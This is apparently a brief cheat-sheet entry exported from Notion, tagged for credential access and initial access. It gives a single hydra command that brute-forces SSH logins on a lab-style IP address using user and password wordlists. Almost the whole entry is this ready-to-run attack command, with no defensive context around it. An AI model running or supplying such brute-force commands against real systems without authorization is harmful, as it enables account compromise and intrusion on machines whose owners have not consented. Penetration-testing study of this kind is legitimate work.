# Hydra Brute Force SSH

OS: Linux
Description: Hydra brute force SH
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

```jsx
hydra -L user.list -P password.list ssh://10.129.42.197
```